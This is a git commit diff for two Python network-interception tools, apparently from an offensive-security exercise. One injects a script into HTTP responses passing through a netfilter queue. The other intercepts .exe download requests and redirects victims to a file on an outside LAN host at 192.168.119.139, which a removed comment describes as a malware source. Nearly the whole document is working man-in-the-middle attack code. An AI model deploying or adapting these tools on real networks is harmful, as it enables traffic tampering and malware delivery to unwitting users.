cda8af9c73d722574da19c5cdc715c668d3b5118
walter v <waltervannoy@yahoo.com>
2025-01-28 22:53:27 -0600

    fixed and finished both html_inj and replace_downloads

--- html_injector/html_injector.py
+++ html_injector/html_injector.py
@@ -1,9 +1,5 @@
 #!/usr/bin/env python3
 
-# iptables -I FORWARD -j NFQUEUE --queue-num 0 <- **run command to create queue which we will bind to**
-# If testing locally, -I INPUT, OUTPUT in two separate commands
-# iptables --flush <- **Run this when you are done, or it will continue using the queue,and you don't want that**
-
 import netfilterqueue
 import scapy.all as scapy
 import re
@@ -13,24 +9,28 @@ def set_load(packet, load):
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
-    packet.set_payload(bytes(packet))
     return packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet.haslayer(scapy.TCP):
-            if scapy_packet[scapy.TCP].dport == 80:
-                print("[+] HTTP packet being sent...")
-                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "",scapy_packet[scapy.Raw].load)
-                new_packet = set_load(scapy_packet,  modified_load)
-                packet.set_payload(bytes(new_packet))
-            elif scapy_packet[scapy.TCP].sport == 80:
-                print("[+] HTTP packet being received...")
-                print(scapy_packet.show())
+    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
+        if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
+            print("[+] Request")
+            mod_load = re.sub(b"Accept-Encoding:.*?\r\n", b"", scapy_packet[scapy.Raw].load)
+            print(mod_load)
+            new_packet = set_load(scapy_packet, mod_load)
+            packet.set_payload(bytes(new_packet))  # Convert to bytes
+        elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
+            print("[+] Response")
+            mod_load = scapy_packet[scapy.Raw].load.replace(
+                b"</body>",
+                b"<script>alert('test');</script></body>"
+            )
+            new_packet = set_load(scapy_packet, mod_load)
+            packet.set_payload(bytes(new_packet))  # Convert to bytes
 
     packet.accept()
 
-queue= netfilterqueue.NetfilterQueue()
+queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
--- replace_downloads/replace_downloads.py
+++ replace_downloads/replace_downloads.py
@@ -1,9 +1,5 @@
 #!/usr/bin/env python3
 
-# iptables -I FORWARD -j NFQUEUE --queue-num 0 <- **run command to create queue which we will bind to**
-# If testing locally, -I INPUT, OUTPUT in two separate commands
-# iptables --flush <- **Run this when you are done, or it will continue using the queue,and you don't want that**
-
 import netfilterqueue
 import scapy.all as scapy
 
@@ -12,30 +8,32 @@ def set_packet(packet, load):
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
-    packet.set_payload(bytes(packet))
     return packet
 
 ack_list = []
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet.haslayer(scapy.TCP):
-            if scapy_packet[scapy.TCP].dport == 80:
-                print("[+] HTTP packet being sent...")
-                if ".exe" in scapy_packet[scapy.Raw].load.decode():
-                    print("[+] exe request found...")
-                    ack_list.append(scapy_packet[scapy.TCP].ack)
-                    print(scapy_packet.show())
-            elif scapy_packet[scapy.TCP].sport == 80:
-                print("[+] HTTP packet being received...")
-                if scapy_packet[scapy.TCP].seq in ack_list:
-                    ack_list.remove(scapy_packet[scapy.TCP].seq)
-                    print("[+] Replacing file...")
-                    modified_packet = set_packet(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/test.exe\n\n") #location in your webserver where you want to download malware from
-                    packet.set_payload(bytes(modified_packet))
+    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
+        if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
+            print("[+] HTTP packet being sent...")
+            if b".exe" in scapy_packet[scapy.Raw].load:  # Keep load as bytes
+                print("[+] exe request found...")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
+            print("[+] HTTP packet being received...")
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file...")
+                modified_packet = set_packet(
+                    scapy_packet,
+                    b"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/test.exe\n\n"
+                )  # Make sure this is bytes
+                packet.set_payload(bytes(modified_packet))  # Convert to bytes
 
     packet.accept()
 
-queue= netfilterqueue.NetfilterQueue()
-queue.bind(1, process_packet)
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
 queue.run()
